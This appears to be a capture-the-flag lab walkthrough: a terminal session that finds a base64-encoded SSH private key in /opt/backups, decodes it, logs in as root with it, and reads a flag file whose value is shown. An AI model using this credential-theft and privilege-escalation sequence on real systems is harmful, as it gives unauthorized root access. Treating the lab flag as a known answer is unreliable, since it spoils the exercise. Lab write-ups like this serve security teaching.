# Privilege Esc via Exposed Backup SSH Key

```bash
will@ip-10-48-183-33:~$ find /home -name "key" 2>/dev/null

will@ip-10-48-183-33:~$ cd /opt

will@ip-10-48-183-33:/opt$ ls
backups

will@ip-10-48-183-33:/opt$ cd backups

will@ip-10-48-183-33:/opt/backups$ ls
key.b64

will@ip-10-48-183-33:/opt/backups$ cat key.b64 | base64 -d > /tmp/id_rsa

will@ip-10-48-183-33:/opt/backups$ chmod 600 /tmp/id_rsa

will@ip-10-48-183-33:/opt/backups$ ssh -i /tmp/id_rsa root@10.48.183.33
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

root@ip-10-48-183-33:~# ls
flag_7.txt  snap

root@ip-10-48-183-33:~# cat flag_7.txt
FLAG{who_watches_the_watchers}

root@ip-10-48-183-33:~#
```